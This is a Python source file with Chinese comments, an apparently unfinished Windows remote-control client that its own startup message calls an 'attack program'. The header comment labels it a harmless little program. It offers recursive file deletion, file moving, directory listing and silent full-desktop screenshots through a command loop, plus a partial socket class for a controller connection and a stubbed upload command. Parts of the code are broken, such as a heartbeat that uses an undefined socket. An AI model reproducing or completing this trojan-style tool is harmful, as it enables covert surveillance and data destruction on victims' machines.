#!/usr/bin/python
# -*- coding: UTF-8 -*-
#这是一个人畜无害的小程序
import os
import socket
import time
import tkinter
import win32gui
import win32ui
import win32con
import win32api
import uuid
import shutil


def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)


class WinControl():
	def __init__(self,patha="",pathb="",ip="",port=0000):
		self.path = ["C:"]
		self.host = ""
		self.patha = patha
		self.pathb = pathb
		self.ip = ip
		self.port = port


	def where_i_am(self):
		#用来反馈现在路径位置的函数
		path = "\\".join(self.path)
		return path


	def cd(self):
		#用来跳跃文件的位置
		if self.patha[0] == ".":
			path = self.patha
			path = path.lstrip(".")
			path = path.split("\\")
			pathlist = self.path + path
			self.path = pathlist

		else:
			self.path = self.patha.split("\\")
		
		return None


	def rm(self):
		#用于文件删除的函数
		if self.patha[0] == ".":
			path = self.patha
			path = path.lstrip(".")
			path = path.split("\\")
			path = self.path + path
			path = "\\".join(path)
		
		else:
			path = self.patha


		remove_dir(path)

		return None


	def mv(self):
		#用于移动文件的函数
		patha = self.patha
		pathb = self.pathb
		shutil.move(patha,pathb)


	def ls(self):
		#用于列出此目录下文件的函数
		if self.patha == "./":
			path = "\\".join(self.path)
		else:
			path = self.patha

		all_list = []
		for root , dirs, files in os.walk(path,topdown=True):
			a = dirs + files
			return a


	def get_photo(self):

		# 获取桌面
		hdesktop = win32gui.GetDesktopWindow()

		# 分辨率适应
		width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
		height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
		left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
		top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

		# 创建设备描述表
		desktop_dc = win32gui.GetWindowDC(hdesktop)
		img_dc = win32ui.CreateDCFromHandle(desktop_dc)

		# 创建一个内存设备描述表
		mem_dc = img_dc.CreateCompatibleDC()

		# 创建位图对象
		screenshot = win32ui.CreateBitmap()
		screenshot.CreateCompatibleBitmap(img_dc, width, height)
		mem_dc.SelectObject(screenshot)

		# 截图至内存设备描述表
		mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)


		filename = str(uuid.uuid4())
		filepath = self.patha + filename + ".bmp"
		# 将截图保存到文件中
		screenshot.SaveBitmapFile(mem_dc, filepath)


		mem_dc.DeleteDC()
		win32gui.DeleteObject(screenshot.GetHandle())

		return None


class Socketz():

	def __init__(self,host,port,data=""):
		self.host = host
		self.port = port
		self.data = data


	def connect(self):
		sock = socket.socket()
		HOST = self.host
		PORT = self.port
		sock.connect((HOST, PORT))
	 

	def heart(self):
		sock.send("up".encode("utf-8"))

		
		


def cmdx(cmd):

	if cmd[0] == "ls":
		if len(cmd) > 1:
			core.patha = cmd[1]
		else:
			core.patha = "./"
		p = core.ls()
		print(p)


	if cmd[0] == "we":
		p = core.where_i_am()
		print(p)


	if cmd[0] == "rm":
		core.patha = cmd[1]
		p = core.rm()
		print(p)


	if cmd[0] == "cd":
		core.patha = cmd[1]
		p = core.cd()
		print(p)


	if cmd[0] == "mv":
		core.patha = cmd[1]
		core.pathb = cmd[2]
		p = core.mv()
		print(p)


	if cmd[0] == "gp":
		core.patha = cmd[1]
		p = core.get_photo()
		print(p)



def main():
	print("攻击程序 客户端启动\n 核心主控程序")
	


'''

	if cmd[0] == "upload":


	
	if cmd[0] == "":
'''

core = WinControl()
while True:

	cmd = input(">>>")
	cmd = cmd.split('@')
	cmdx(cmd)



























